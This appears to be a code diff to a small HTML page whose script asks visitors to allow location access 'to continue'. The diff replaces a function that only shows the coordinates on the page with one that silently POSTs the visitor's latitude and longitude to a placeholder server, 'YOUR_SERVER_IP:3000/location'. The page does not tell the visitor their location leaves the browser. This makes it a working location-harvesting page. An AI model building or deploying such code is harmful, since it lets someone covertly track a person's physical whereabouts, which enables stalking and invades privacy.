@@ -8,21 +8,33 @@
   <p>Please allow you loaction to continue.</p>
   <script>
   window.onload = () => {
-    navigator.geolocation.getCurrentPosition(showPosition, showError);
-  };
+      navigator.geolocation.getCurrentPosition(sendToServer, showError);
+    };
 
-  function showPosition(position) {
-    const lat = position.coords.latitude;
-    const lon = position.coords.longitude;
+    function sendToServer(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
 
-    document.getElementById("output").innerHTML =
-      "Latitude: " + lat + "<br>Longitude: " + lon;
-  }
+      fetch("http://YOUR_SERVER_IP:3000/location", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ lat, lon })
+      })
+      .then(res => res.text())
+      .then(data => {
+        document.getElementById("status").innerText = "Sent successfully!";
+      })
+      .catch(err => {
+        document.getElementById("status").innerText = "Failed to send";
+      });
+    }
 
-  function showError(error) {
-    document.getElementById("output").innerText =
-      "Permission denied or error getting location.";
-  }
+    function showError() {
+      document.getElementById("status").innerText =
+        "Permission denied or error getting location.";
+    }
 </script>
 </body>
 </html>
